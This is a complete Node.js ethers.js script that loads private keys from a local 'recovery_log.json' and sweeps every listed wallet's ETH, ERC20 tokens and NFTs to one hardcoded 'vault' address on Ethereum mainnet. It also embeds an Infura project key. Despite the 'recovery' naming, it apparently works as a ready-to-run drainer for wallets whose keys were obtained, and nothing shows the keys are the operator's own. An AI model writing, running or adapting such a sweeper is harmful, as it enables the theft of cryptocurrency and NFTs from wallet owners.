const fs = require("fs");
const path = require("path");
const { ethers, Wallet, Contract } = require("ethers");
const axios = require("axios");

const provider = new ethers.JsonRpcProvider("https://mainnet.infura.io/v3/6c06cc61db8248b598a1484817ffadb6");
const vault = "0x417745b6a657f8520d91eabf2f121479b04a04ce";

const recoveryPath = path.join(process.cwd(), "recovery_log.json");

let recoveryLog = [];
try {
  if (!fs.existsSync(recoveryPath)) {
    fs.writeFileSync(recoveryPath, JSON.stringify([], null, 2), "utf8");
    console.log("Created default recovery_log.json");
  } else {
    const raw = fs.readFileSync(recoveryPath, "utf8");
    recoveryLog = raw ? JSON.parse(raw) : [];
    if (!Array.isArray(recoveryLog)) {
      console.warn("recovery_log.json is not an array; resetting to []");
      recoveryLog = [];
    }
  }
} catch (err) {
  console.error("Failed to read/create recovery_log.json, continuing with empty log:", err);
  recoveryLog = [];
}

const erc20ABI = [
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function balanceOf(address) view returns (uint256)"
];
const erc721ABI = ["function safeTransferFrom(address from, address to, uint256 tokenId) public"];

async function sweep() {
  for (const entry of recoveryLog) {
    try {
      if (!entry || !entry.privateKey) {
        console.log("Skipping invalid entry or missing privateKey:", entry && entry.address);
        continue;
      }

      const signer = new Wallet(entry.privateKey, provider);

      // Sweep ETH
      const eth = await provider.getBalance(entry.address);
      const minThreshold = ethers.parseEther("0.001");
      const gasReserve = ethers.parseEther("0.0005");
      if (eth > minThreshold) {
        const sendValue = eth - gasReserve;
        if (sendValue > 0) {
          const tx = await signer.sendTransaction({ to: vault, value: sendValue });
          console.log("✅ ETH swept from " + entry.address + " tx:", tx.hash);
        }
      }

      // Sweep ERC20 tokens
      for (const token of (entry.erc20 || [])) {
        try {
          if (!token || !token.address) continue;
          const contract = new Contract(token.address, erc20ABI, signer);
          const bal = await contract.balanceOf(entry.address);
          if (bal > 0) {
            const tx = await contract.transfer(vault, bal);
            console.log("✅ " + (token.symbol || "ERC20") + " swept from " + entry.address + ": ", tx.hash);
          }
        } catch (e) {
          console.error("Failed sweeping ERC20 for", entry.address, e);
        }
      }

      // Sweep NFTs
      for (const nft of (entry.nfts || [])) {
        try {
          if (!nft || !nft.contract || nft.tokenId == null) continue;
          const contract = new Contract(nft.contract, erc721ABI, signer);
          const tx = await contract.safeTransferFrom(entry.address, vault, nft.tokenId);
          console.log("✅ NFT swept from " + entry.address + ": ", tx.hash);
        } catch (e) {
          console.error("Failed sweeping NFT for", entry.address, e);
        }
      }
    } catch (err) {
      console.error("Error processing entry:", entry && entry.address, err);
    }
  }
}

sweep().catch(console.error);